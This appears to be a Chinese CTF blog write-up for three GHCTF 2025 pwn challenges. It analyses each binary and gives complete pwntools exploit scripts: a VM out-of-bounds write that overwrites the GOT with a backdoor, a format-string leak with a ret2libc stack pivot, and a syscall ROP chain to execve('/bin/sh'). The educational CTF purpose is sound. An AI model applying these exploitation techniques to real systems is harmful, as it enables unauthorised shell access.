---
title: GHCTF-2025-pwn
tags:
    - 新生赛
    - pwn
categories:
    - 比赛记录
cover: /img/治不开心药.png
---
# GHCTF my_vm

## ida分析

### main函数分析
1.存在backdoor()函数，点开发现system("/bin/sh\x00").可以直接利用这个地址0x400877.
2.funcptr会调用my_print,如果可以修改my_print 为backdoor。那就很完美了
3.memory中保存着我们的指令，execute 会按序执行我们的指令，查看这个函数。

### execute函数分析

1.首先看，对op的处理，和对op的限制
2.寻找漏洞。option == 0x90 时，可以对memory上的数据作修改
3.基于此，如果`reg[dest]`设置为负数，那么可以完成对其他数据的修改
4.从第三张图，查看option == 0x90 时的汇编，发现赋值指令是movzx(有符号低扩展为有符号高)，所以可以在`reg[]`中写入负数，完成数组的向上越界

## 构造思路
1.首先是，ip和sp。ip从0开始，也就从我们读入的第一个指令执行。sp设置为1，大于0就行
2.接着读入op。我们需要对op作一点处理，便于控制每一个字节

```python
def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))
```
通过样的处理，我们可以控制每个字节，便于准确的控制
3.需要找到要覆盖的目标地址，dest_addr. 这一题中可以覆盖func的内容为backdoor.另外，常见的手法可以覆盖got表内容为backdoor .此题中我采用了后者的方法
4.计算对应dest_addr的偏移，这里从汇编中可以看出来，此题中的memory和reg均是以`rax*4` 来寻址。可知，均是4字节数组.所以对应偏移需要除以4，才能被数组寻到
5.得到偏移之后，利用0x90控制数据，注意到，数据会被改写为src1.因此，在调用前需要将某个reg内写入我们的backdoor
6.最后，因为我们不能直接往reg里写入任意数据，有字节和大小的限制。所以我们需要通过题目提供的运算操作，一步一步修改内容.

## exp 

### 修改puts_got
```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node1.anna.nssctf.cn'
port=28844
elf=ELF("./my_vm")
if mode == 0:
    io=process("./my_vm")
else :
    io=remote(url,port)

def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))

backdoor=0x400877 # system("/bin/sh\x00")

io.sendlineafter("set your IP:","0")
io.sendlineafter("set your SP:","1")
io.sendlineafter("execve:",str(27))

puts_got=0x602018
offset=0x6020e0-0x602018
reg=0x6420E0
memory=0x6020E0
###


###

### Code 
Code(0x10,0,0,0x8)  # reg[0]=0x8
Code(0x10,1,0,0x4)  # reg[1]=0x4
Code(0x40,2,1,0)    # reg[2]=0xc
Code(0x80,3,2,1)    # reg[3]=reg[1]<<reg[1]  : reg[3]=0xc0
Code(0x10,4,0,0x6)  # reg[4]=0x6
Code(0x40,4,4,0)    # reg[4]=0xe
Code(0x40,3,3,4)    # reg[1]=reg[1]+reg[3]   : reg[3]=0xce      
Code(0x10,5,0,0x7)  # reg[5]=0x7
Code(0x40,5,5,0)    # reg[5]=0xf
Code(0x80,6,5,1)    # reg[6]=reg[5]<<reg[1]  : reg[6]=0xf0
Code(0x40,6,6,5)    # reg[6]=reg[5]+reg[6]   : reg[6]=0xff 
Code(0x80,5,6,0)    # reg[5]=reg[6]<<reg[0]  : reg[5]=0xff00
Code(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffff
Code(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffff00
Code(0x40,5,5,6)    # reg[5]=reg[5]+reg[6]   : reg[5]=0xffffff
Code(0x80,5,5,0)    # reg[5]=reg[5]<<reg[0]  : reg[5]=0xffffff00
Code(0x40,5,5,3)    # reg[5]=reg[5]+reg[3]   : reg[5]=0xffffffce

#0x400877
Code(0x10,4,0,0x7)  # reg[4]=0x7
Code(0x80,6,4,1)    # reg[6]=reg[4]<<reg[1]  : reg[6]=0x70
Code(0x40,6,6,4)    # reg[6]=reg[6]+reg[4]   : reg[6]=0x770000
Code(0x80,1,1,1)    # reg[1]=reg[1]<<reg[1]  : reg[1]=0x40
Code(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x4000
Code(0x80,1,1,0)    # reg[1]=reg[1]<<reg[0]  : reg[1]=0x400000
Code(0x80,0,0,0)    # reg[0]=reg[0]<<reg[0]  : reg[0]=0x800
Code(0x40,0,0,6)    # reg[0]=reg[0]+reg[6]   : reg[0]=0x877
Code(0x40,1,1,0)    # reg[1]=reg[1]+reg[0]   : reg[1]=0x4000877
Code(0x90,5,1,0)    # mem[reg[5]]=reg[1]     : mem[-50]=0x4000877
#gdb.attach(io)
io.interactive()
```

### 覆盖func
```python 
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=0
url='node1.anna.nssctf.cn'
port=28844
elf=ELF("./my_vm")
if mode == 0:
    io=process("./my_vm")
else :
    io=remote(url,port)

def Code(op,dest,src1,src2):
    code=(op<<24)+(dest<<16)+(src1<<8)+src2
    io.sendline(str(code))

io.sendlineafter("set your IP:","0")
io.sendlineafter("set your SP:","1")
io.sendlineafter("execve:",str(14))


### Code 
Code(0x10,0,0,8)   #reg[0]=8
Code(0x10,1,0,0)
Code(0x50,1,1,0)   #reg[1]=-8
Code(0x10,2,0,7)   #reg[2]=7
Code(0x10,4,0,4)   #reg[4]=4
Code(0x80,3,2,4)   #reg[3]=0x70
Code(0x40,3,3,2)   #reg[3]=0x77
### backdoor  
Code(0x80,4,4,4)   #reg[4]=0x40
Code(0x80,4,4,0)   #reg[4]=0x4000
Code(0x80,4,4,0)   #reg[4]=0x400000
Code(0x80,0,0,0)   #reg[0]=0x800
Code(0x40,0,0,3)   #reg[0]=0x877
Code(0x40,4,4,0)   #reg[4]=0x400877
Code(0x90,1,4,0)
io.interactive()

```

# GHCTF ret2libc2

## ida分析

### func函数分析
![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)
1.程序很简单,main函数里只有init和func，这里直接看到func函数
2.可以看到存在一个格式化字符串漏洞和溢出漏洞.
3.程序没有提供system和`/bin/sh\x00`，需要泄露libc，完成ret2libc.

### func汇编分析
![98a456adebe8adb789ba9ca00f26a510](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/98a456adebe8adb789ba9ca00f26a510.png)
1.从汇编中可以看到更多信息.
2.首先是在leave ret 之前，lea rax [rbp+buf]. 实际上是将我们的输入的起始位置的内容交给了rax.而且可以注意到，无论是printf还是两个puts，都是通过rax来设置rdi。那么也就说我们的输入，可以给printf传递参数，也就是可以实现我们的格式化字符串漏洞.
3.同时，leave ret 留下了栈迁移的隐患。

### gdb调试分析
![65dadea8bb2e5a40f2a81d8411fea262.png](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/65dadea8bb2e5a40f2a81d8411fea262_720.png)
1.通过gdb动调寻找栈上可以泄露出libc的函数.将func的返回地址覆盖为0x401227，直接将printf的rdi修改成我们的输入，查看这一帧栈帧，在0x15的位置看到了__libc_start_main,计算偏移为21+6=27.
2.同时，在第一次溢出时，需要覆盖rbp为有效地址。否则，这次func执行最后，会崩溃掉。

## 构造思路
1.首先确定泄露libc的手段，格式化字符串.并且第一次溢出时需要栈迁移.在这里补充一点，除了使用格式化字符串以外，还有一种泄露的手法.观察func函数，0x401223处，会将rbp-0x10 的内容作为参数赋给rax，再下方又被赋给了rdi.那么如果[rbp-0x10]是某个got表，那就可以把got表的内容打印出来。所以我们只需要把某个got-0x10交给rbp，就可以完成第一次的栈迁移和libc的泄露。
2.因为程序本身是没有提供pop_rdi,但是题目给了libc.so.6文件，在泄露libc基址之后，利用libc.so.6中的pop rdi;ret，一样可以控制rdi寄存器。现在我们已经有了ret2libc的全部条件。只需要栈迁移的一个合适的地址，完成rop。
3.选择bss段的高地址完成这段rop。如果是采用第二种方法泄露libc的话，需要再栈迁移一次，而且为了保证程序的顺利执行，第二次溢出，需要注意维护got表的内容尤其是read，否则第三次溢出就会出错。

## exp

### 格式化字符串
```python 
from pwn import *
context(os='linux',arch='amd64',log_level='debug')
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
io=process("./ret2libc2")
#libc=ELF("libc.so.6")
#io=remote("node2.anna.nssctf.cn",28626)
elf=ELF("./ret2libc2")
bss=0x404060
ret=0x4011fa
gdb.attach(io)

payload1=b'%27$p'.ljust(8,b'a')
payload1=payload1.ljust(0x30,b'a')+p64(bss+0x900)+p64(0x401227)
io.sendafter(b'show your magic\n',payload1)
start_addr=int(io.recv(14),16)-128
libc_base=start_addr-libc.symbols['__libc_start_main']
log.success("start_addr-{}".format(hex(start_addr)))
pop_rdi=libc_base+0x2a3e5
system=libc_base+libc.symbols['system']
binsh=libc_base+next(libc.search(b'/bin/sh'))
one=libc_base+0xebc85

payload2=b'a'*(0x38)+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)
io.sendafter(b'show your magic\n',payload2)
io.interactive()
```

### 迁移泄露

```python
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node2.anna.nssctf.cn'
port=28268
elf=ELF("./ret2libc2")
libc=ELF("./libc.so.6")
if mode == 0:
    io=process("./ret2libc2")
else :
    io=remote(url,port)


#leave_ret=0x
puts_got=elf.got['puts']
puts_plt=elf.plt['puts']
complete=0x404070
func=0x40121f
magic=0x401252
bss=elf.bss()+0x500+0x500
rsp_8=0x401016
offset=0x30+8
payload=b'%13$s'.ljust(0x30,b'\x61')
payload+=p64(0x404038)
payload+=p64(func)
payload+=p64(puts_got)

#
io.sendafter("show your magic\n",payload)

read=u64(io.recv(6).ljust(8,b'\x00'))
log.success('read-{}'.format(hex(read)))

libc_base=read-libc.sym['read']
sys=libc_base+libc.sym['system']
puts=libc_base+libc.sym['puts']
printf=libc_base+libc.sym['printf']
setvbuf=libc_base+libc.sym['setvbuf']
bin_sh=libc_base+next(libc.search(b"/bin/sh\x00"))
pop_rdi=libc_base+0x2a3e5
ret=libc_base+0x29139

payload=p64(0)*2+p64(puts)+p64(printf)+p64(read)+p64(setvbuf)
payload+=p64(bss)+p64(magic)
io.sendafter("show your magic\n",payload)
#gdb.attach(io)
payload=offset * b'a'
payload+=p64(pop_rdi)
payload+=p64(bin_sh)
payload+=p64(ret)
payload+=p64(sys)
io.send(payload)

io.interactive()
```

#  GHCTF 你真的会布置栈吗？

## ida分析

### start函数分析 

![813b6b639a05fd8870ff80b5be117df7](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/813b6b639a05fd8870ff80b5be117df7.png)

1.print了两段字符，然后调用sys_read()读取数据，溢出空间非常大
2.最后，不是leave ret，而是jmp rsp，var8 是 qword ptr -8  ，可以从汇编代码查看

### print函数分析
![a36c17d8abe90bc1a9920db0595e982d](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/a36c17d8abe90bc1a9920db0595e982d.png)
1.print是通过sys_wirte()，实现写字符，最后也是jmp rsp.


### gadgets 分析
1.gadgets都已经在上面的图中，可以看到，我们能直接控制的有rsi,rdi,rbx,r13,r15，最后还会jmp r15.
2.从print的汇编中可以看到，可以交换rax和r13 的值，因此可以间接控制rax.
3.同时，dispatch留有执行rbx中代码的功能.
4.下方还可以控制rdx，rsi，rdi 值为0.

## 构造思路
1.首先，在_start 函数中有很明显的溢出漏洞，并且通过jmp rsp 可以跳转到我们写入的地址。第一眼，考虑shellcode ，但是一下就可以排除。因为它不会执行shellcode，而是跳转地址。因为题目只有系统调用的函数，所以肯定是用syscall解题。
2.确定是用syscall写题之后，考虑要控制的寄存器。首先execve函数的系统调用号是0x3b，需要设置rax=0x3b，可以通过r13 和 `xchg rax，r13` 实现，接着是rsi 设置为0 ，rdx 设置为0 ，rdi设置为，`"/bin/sh\x00"` 的地址。但是程序中没有该字符串，所以需要，先调用一次read往程序上写入字符串。
3.read函数，需要控制rax=0，rsi为buf，即写入的地址，rdx为写入字符数。可以利用gadgets 设置rsi 完成任意地址写，利用本身的sys_read 设置字节为0x539。因为程序没有bss段，所以只能往data段上写入字符。
4.那么目前的思路就是，利用sys_read往data段写入字符，再执行execve，getshell
5.但是似乎忽略了一点。rdx，本身是0x539，我们没有修改，需要通过xor_rdx 来修改为0 ，但是这条指令进跟着的是jmp r15.意味着，我们不能设置r15 为xor_rdx。 考虑让r15 指向xchg rax，r13，将rsp 设置为xor_rdx,也陷入了循环。似乎无法跳出循环。
6.此时注意到dispatch,可以跳转到rbx中的指令，而且每次执行会加8，也就是可以执行下一条指令。这样一来，我们把r15 指向dispatch，同时设置rbx为之前sys_read时，buf的地址.然后，之前sys_read时在buf 里依次布置指令，xor_rdx，xchg rax,r13 的地址。这样，将rdx置0 后，程序会跳转到xchg rax，r13 ，将rax 设置为r13的值.最后将rsp 设置为，syscall，就可以完成这华丽的rop。

## exp 

### 花里胡哨的rop
```python 
from pwn import *
from libcfind import *
from LibcSearcher import *
context(os='linux',arch='amd64',log_level='debug')
mode=1
url='node2.anna.nssctf.cn'
port=28634
elf=ELF("./attachment")
if mode == 0:
    io=process("./attachment")
else :
    io=remote(url,port)

sys_call=0x401077
rax_r13=0x40100c
data=0x402000
gadget_pop=0x401017
dispatcher=0x401011
xor_rsi=0x401027
Free_Gate=0x40101c
xor_rdx=0x401021

payload=p64(gadget_pop)
payload+=p64(0)*3
payload+=p64(gadget_pop) #r15
payload+=p64(data) #rsi ,rsp
payload+=p64(0)*3 #rdi,rbx,r13
payload+=p64(rax_r13) #r15 
payload+=p64(Free_Gate)
payload+=p64(sys_call) #r15   read

payload+=p64(gadget_pop)# rsp,rsi
payload+=p64(data)+p64(0)+p64(0)# rdi,rbx,r13
payload+=p64(gadget_pop)# r15
payload+=p64(0) # rsp,rsi
payload+=p64(data)+p64(data)+p64(0x3b) # rdi,rbx,r13
payload+=p64(dispatcher)#r15
payload+=p64(sys_call)

io.send(payload)
payload=b'/bin/sh\x00'
payload+=p64(xor_rdx)+p64(rax_r13)
#gdb.attach(io)
io.send(payload)


io.interactive()
```